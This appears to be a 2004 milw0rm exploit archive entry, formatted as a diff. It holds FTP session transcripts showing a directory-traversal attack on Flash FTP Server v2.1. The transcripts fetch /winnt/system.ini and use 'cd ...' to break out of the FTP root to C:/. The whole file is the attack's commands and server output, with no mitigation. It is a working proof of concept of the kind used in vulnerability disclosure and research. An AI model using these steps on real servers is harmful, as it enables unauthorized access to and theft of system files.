@@ -1,0 +1,44 @@
+TestCode:
+C:\>ftp localhost
+Connected to server.
+220 Flash FTP Server v2.1 ready...
+User (server:(none)): CoolICE
+331 Password required for CoolICE.
+Password:
+230 User CoolICE logged in.
+ftp> get /winnt/system.ini
+200 Port command successful.
+150 Opening data connection for /winnt/system.ini.
+226 File sent ok
+ftp: 227 bytes received in 0.01Seconds 22.70Kbytes/sec
+ftp>
+
+--------------------------
+C:\>ftp -d localhost
+Connected to server.
+220 Flash FTP Server v2.1 ready...
+User (Server:(none)): anonymous
+---> USER anonymous
+331 Password required for anonymous.
+Password:
+---> PASS CoolICE@China.com
+230 User anonymous logged in.
+ftp> pwd
+---> XPWD
+257 "/C:/inetpub/ftproot/" is current directory.
+ftp> cd /
+---> CWD /
+501 CWD failed. No permission
+---> CWD ..
+501 CWD failed. No permission
+ftp> cd ...
+---> CWD ...
+250 CWD command successful. "C:/inetpub/ftproot/.../" is current directory.
+ftp> cd /
+---> CWD /
+501 Cannot accept relative path using dot notation
+ftp> pwd
+---> XPWD
+257 "/C:/" is current directory.
+
+# milw0rm.com [2004-07-22]
